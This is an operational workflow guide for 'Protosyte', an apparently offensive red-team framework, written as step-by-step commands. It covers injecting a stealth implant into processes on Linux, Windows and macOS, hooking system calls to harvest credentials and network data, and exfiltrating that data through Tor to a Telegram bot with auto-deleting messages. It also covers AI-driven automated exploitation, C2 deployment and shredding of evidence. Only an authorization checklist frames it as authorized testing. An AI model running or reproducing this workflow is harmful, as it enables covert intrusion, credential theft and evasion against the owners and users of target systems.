# Operational Workflow Guide

## Overview

This document provides complete operational workflows for deploying and operating the Protosyte framework in authorized penetration testing and red team exercises.

## Complete Campaign Workflow

### Phase 1: Preparation and Setup

#### 1.1 Obtain Authorization

- ✅ Written authorization from target organization
- ✅ Scope definition document
- ✅ Rules of Engagement (ROE)
- ✅ Legal review if required

#### 1.2 Environment Setup

```bash
# Clone repository
git clone <repository-url>
cd Protosyte

# Setup environment
./scripts/setup-env.sh
nano .env  # Configure environment variables

# Configure mission
cp mission.yaml.example mission.yaml
nano mission.yaml  # Edit mission parameters
```

#### 1.3 Build Components

```bash
# Build all components
./scripts/build-all.sh

# Or build individually
cd protosyte-seed && cargo build --release
cd ../analysis-rig && go build -o protosyte-rig
cd ../broadcast-engine && go build -o protosyte-broadcast
```

#### 1.4 Setup Telegram Bot

1. Open Telegram, search for `@BotFather`
2. Send `/newbot` and follow instructions
3. Save bot token securely
4. Configure bot settings:
   - `/setjoingroups` → Disabled
   - `/setprivacy` → Enabled
5. Store token in environment variable:
   ```bash
   export PROTOSYTE_BOT_TOKEN="your_token"
   ```

#### 1.5 Setup Analysis Rig VM

```bash
# 1. Create VM with dual network adapters:
#    - Adapter 1: NAT/Bridged (WAN) - disabled by default
#    - Adapter 2: Host-only - static IP 192.168.56.10

# 2. Install base OS (Alpine/Debian)

# 3. Install dependencies
sudo apt-get update
sudo apt-get install -y tor torsocks sqlite3

# 4. Install Go (if not included)
# Download and install Go 1.24+

# 5. Copy binary to VM
scp protosyte-rig user@192.168.56.10:/home/user/

# 6. Create baseline snapshot
# "Baseline - Clean State"
```

---

### Phase 2: Initial Access (Optional - AI-Powered)

#### 2.1 Reconnaissance

```bash
# Port scanning
nmap -sV -p- target-ip

# Web enumeration
gobuster dir -u https://target-ip -w wordlist.txt

# Technology stack analysis
whatweb https://target-ip
```

#### 2.2 AI-Powered Analysis (Optional)

```bash
cd protosyte-ai

# Run AI analysis
go run ollama_integration.go --target target-ip

# AI will:
# 1. Analyze target
# 2. Search for CVEs
# 3. Generate exploits
# 4. Attempt automated exploitation
```

#### 2.3 Initial Access Achievement

After successful initial access, proceed to Phase 3.

---

### Phase 3: Silent Seed Deployment

#### 3.1 Choose Deployment Method

**Linux:**
```bash
# Method 1: LD_PRELOAD
LD_PRELOAD=/path/to/libprotosyte.so /path/to/target_app

# Method 2: Process injection
# Use ptrace or eBPF-based injection
```

**Windows:**
```bash
# Method 1: DLL Injection
# Use SetWindowsHookEx or classic DLL injection

# Method 2: Process Hollowing
# See protosyte-seed-windows/README.md
```

**macOS:**
```bash
# Method 1: DYLD_INSERT_LIBRARIES
DYLD_INSERT_LIBRARIES=/path/to/libprotosyte.dylib /path/to/app

# Method 2: Function Interposing
# See protosyte-seed-macos/README.md
```

#### 3.2 Verify Deployment

- Monitor Telegram bot for incoming messages
- Check Broadcast Engine logs
- Verify data collection is working

---

### Phase 4: Broadcast Engine Operation

#### 4.1 Start Broadcast Engine

**Option 1: Local (Development)**
```bash
cd broadcast-engine
export PROTOSYTE_BOT_TOKEN="your_token"
go run main.go
```

**Option 2: Ephemeral Cloud (Production)**
```bash
# Deploy to Fly.io, Render, etc.
# Configure via environment variables
# Auto-shutdown after inactivity
```

#### 4.2 Monitor Operations

- Monitor bot for incoming messages
- Verify automatic message deletion (30-second window)
- Check logs for errors
- Monitor Tor connectivity

---

### Phase 5: Intelligence Collection

#### 5.1 Passive Collection

Silent Seed automatically:
- Hooks system calls
- Filters sensitive data
- Encrypts and compresses
- Exfiltrates via Tor to Telegram

**No operator interaction needed** - completely passive.

#### 5.2 Collection Monitoring

```bash
# Check Broadcast Engine logs
tail -f broadcast-engine.log

# Monitor Telegram bot (manual check)
# Messages should auto-delete after 30 seconds
```

---

### Phase 6: Intelligence Analysis

#### 6.1 Prepare Analysis Rig VM

```bash
# 1. Restore VM to baseline snapshot
# 2. Verify network isolation (WAN disabled, host-only enabled)
# 3. Verify Tor is installed and running
# 4. Verify binary is present
```

#### 6.2 Retrieve Payloads

```bash
# Enable WAN adapter (VM-specific command)

# Retrieve encrypted payloads
export PROTOSYTE_BOT_TOKEN="your_token"
torsocks ./protosyte-rig --mode retrieve

# Expected output:
# [RIG] Starting retrieval mode
# [RIG] Retrieved X payloads

# DISABLE WAN ADAPTER IMMEDIATELY AFTER
```

#### 6.3 Analyze Intelligence

```bash
# Set passphrase
export PROTOSYTE_PASSPHRASE="your_passphrase"

# Analyze and decrypt payloads
./protosyte-rig --mode analyze

# Expected output:
# [RIG] Starting analysis mode
# [RIG] Processing payloads...
# [RIG] Analysis complete.
```

#### 6.4 Query Intelligence Data

```bash
# View statistics
./protosyte-rig --mode stats

# Output:
# STATISTICS
# ==========
# Total Records:    1247
# Credentials:      342
# Network Flows:    589
# ...

# List records
./protosyte-rig --mode records --limit 50

# List hosts
./protosyte-rig --mode hosts

# Export to JSON
./protosyte-rig --mode records --limit 1000 --format json > records.json
```

#### 6.5 Advanced Queries

```bash
# Count records by type
./protosyte-rig --mode stats --format json | jq '.by_type'

# Find specific host
./protosyte-rig --mode hosts --format json | jq '.hosts[] | select(.fingerprint | contains("abc123"))'

# Filter by data type
./protosyte-rig --mode records --format json | jq '.records[] | select(.data_type == "CREDENTIAL_BLOB")'

# Export to CSV
./protosyte-rig --mode records --limit 10000 --format json | \
  jq -r '.records[] | [.id, .data_type, .host_fingerprint, .collected_at] | @csv' > records.csv
```

---

### Phase 7: Reporting

#### 7.1 Generate FIP

```bash
# Generate Forensic Intelligence Packet
./protosyte-rig --mode fip

# Output:
# FIP Generated Successfully
# ==========================
# Path:    /tmp/rig_out/forensic_intel_packet.json.gz
# Hash:    abc123def456...
# Records: 1247
```

#### 7.2 Transfer FIP to Host

```bash
# From host machine
scp user@192.168.56.10:/tmp/rig_out/forensic_intel_packet.json.gz ./
scp user@192.168.56.10:/tmp/rig_out/forensic_intel_packet.json.gz.sha256 ./

# Verify hash
sha256sum -c forensic_intel_packet.json.gz.sha256
```

#### 7.3 Generate Reports

```bash
# Extract FIP
gunzip forensic_intel_packet.json.gz

# Analyze with jq
jq '.record_count' forensic_intel_packet.json
jq '.records[] | select(.data_type == "CREDENTIAL_BLOB")' forensic_intel_packet.json

# Generate summary report
jq '{
  total_records: .record_count,
  records_by_type: [.records | group_by(.data_type) | .[] | {type: .[0].data_type, count: length}],
  unique_hosts: [.records | [.[].host_fingerprint] | unique | length]
}' forensic_intel_packet.json > summary.json
```

---

### Phase 8: Cleanup and Sanitization

#### 8.1 Secure Data Backup

```bash
# Backup database
sqlite3 /tmp/rig_intel.db ".backup '/path/to/backup/backup.db'"

# Encrypt backup
gpg --symmetric --cipher-algo AES256 backup.db
rm backup.db
```

#### 8.2 Cleanup Analysis Rig VM

```bash
# 1. Generate FIP and transfer to host
# 2. Backup database securely
# 3. Securely delete database
shred -u /tmp/rig_intel.db

# 4. Delete payloads
rm -rf /tmp/rig_store/*

# 5. Restore VM to baseline snapshot
# OR destroy VM completely
```

#### 8.3 Cleanup Broadcast Engine

```bash
# If running locally:
# Stop process
# Securely delete logs

# If on ephemeral cloud:
# Delete deployment
# Verify data is destroyed
```

#### 8.4 Credential Rotation

```bash
# Generate new Telegram bot token
# Update environment variables
# Revoke old token
# Update all configurations
```

---

## Daily Operational Procedures

### Morning Routine

```bash
# 1. Check Broadcast Engine status
# 2. Check Silent Seed collection (via bot monitoring)
# 3. Review previous day's intelligence
./protosyte-rig --mode stats
```

### Mid-Day Check

```bash
# 1. Retrieve new payloads (if needed)
torsocks ./protosyte-rig --mode retrieve

# 2. Analyze new payloads
./protosyte-rig --mode analyze

# 3. Quick statistics check
./protosyte-rig --mode stats
```

### Evening Routine

```bash
# 1. Full intelligence review
./protosyte-rig --mode records --limit 100

# 2. Host activity analysis
./protosyte-rig --mode hosts

# 3. Generate daily summary
./protosyte-rig --mode stats --format json > daily_summary_$(date +%Y%m%d).json
```

---

## Weekly Procedures

### Weekly Intelligence Review

```bash
# 1. Export all records
./protosyte-rig --mode records --limit 10000 --format json > weekly_export.json

# 2. Generate comprehensive statistics
./protosyte-rig --mode stats --format json > weekly_stats.json

# 3. Host activity analysis
./protosyte-rig --mode hosts --format json > weekly_hosts.json

# 4. Generate FIP
./protosyte-rig --mode fip
```

### Database Maintenance

```bash
# See DATABASE_MANAGEMENT.md for details

# 1. Backup database
# 2. Integrity check
# 3. Vacuum (reclaim space)
# 4. Archive old records (if needed)
```

---

## Troubleshooting Workflows

### Silent Seed Not Collecting Data

1. **Verify Deployment**:
   ```bash
   # Check if process is running
   ps aux | grep protosyte
   
   # Check system call hooks
   # Platform-specific verification
   ```

2. **Check Network Connectivity**:
   ```bash
   # Verify Tor is running
   systemctl status tor
   
   # Test Tor connectivity
   torsocks wget -O- https://check.torproject.org
   ```

3. **Verify Telegram Bot**:
   ```bash
   # Check bot token
   echo $PROTOSYTE_BOT_TOKEN
   
   # Test bot access
   # (Manual Telegram check)
   ```

### Broadcast Engine Not Receiving Messages

1. **Verify Bot Configuration**:
   - Check bot token
   - Verify bot privacy settings
   - Check bot is running

2. **Check Network**:
   ```bash
   # Verify Tor connectivity
   # Check firewall rules
   # Verify Telegram API access
   ```

### Analysis Rig Cannot Retrieve Payloads

1. **Verify WAN Connectivity**:
   ```bash
   # Check WAN adapter is enabled
   # Verify Tor is running
   torsocks wget -O- https://www.google.com
   ```

2. **Check Payload Window**:
   - Messages auto-delete after 30 seconds
   - Retrieve immediately after Broadcast Engine receives
   - Or increase retrieval frequency

3. **Verify Bot Token**:
   ```bash
   export PROTOSYTE_BOT_TOKEN="your_token"
   torsocks ./protosyte-rig --mode retrieve
   ```

### Database Issues

1. **Corruption Check**:
   ```bash
   sqlite3 /tmp/rig_intel.db "PRAGMA integrity_check;"
   ```

2. **Recovery**:
   ```bash
   # Restore from backup
   # Or repair if possible
   sqlite3 /tmp/rig_intel.db ".recover" | sqlite3 recovered.db
   ```

See `DATABASE_MANAGEMENT.md` for detailed procedures.

---

## Integration Workflows

### AdaptixC2 Integration

```bash
# 1. Configure mission.yaml
adaptixc2:
  enabled: true
  auto_deploy_protosyte: true

# 2. Set environment variables
export ADAPTIXC2_SERVER_URL="https://adaptixc2.example.com"
export ADAPTIXC2_API_KEY="your_api_key"

# 3. Start AdaptixC2 bridge
cd protosyte-adaptixc2
go run main.go

# 4. Protosyte will be automatically deployed via AdaptixC2 agents
```

### AI Integration Workflow

```bash
# 1. Install Ollama
curl -fsSL https://ollama.com/install.sh | sh
ollama pull llama3.2

# 2. Run AI analysis
cd protosyte-ai
go run ollama_integration.go --target target-ip

# 3. After successful exploitation, deploy Silent Seed
# (See Phase 3)
```

---

## Quick Reference

### Essential Commands

```bash
# Retrieve payloads
torsocks ./protosyte-rig --mode retrieve

# Analyze intelligence
./protosyte-rig --mode analyze

# View statistics
./protosyte-rig --mode stats

# List records
./protosyte-rig --mode records --limit 50

# List hosts
./protosyte-rig --mode hosts

# Generate FIP
./protosyte-rig --mode fip

# Mission info
./protosyte-rig --mode mission

# AdaptixC2 status
./protosyte-rig --mode adaptixc2
```

### Environment Variables

```bash
export PROTOSYTE_BOT_TOKEN="your_token"
export PROTOSYTE_PASSPHRASE="your_passphrase"
export PROTOSYTE_MISSION_ID="0xDEADBEEFCAFEBABE"
export ADAPTIXC2_SERVER_URL="https://adaptixc2.example.com"
export ADAPTIXC2_API_KEY="your_api_key"
```

---

## See Also

- `SECURITY_PROCEDURES.md` - Security and OPSEC procedures
- `analysis-rig/DATABASE_MANAGEMENT.md` - Database management
- `analysis-rig/README.md` - Analysis Rig documentation
- Component-specific READMEs for detailed procedures
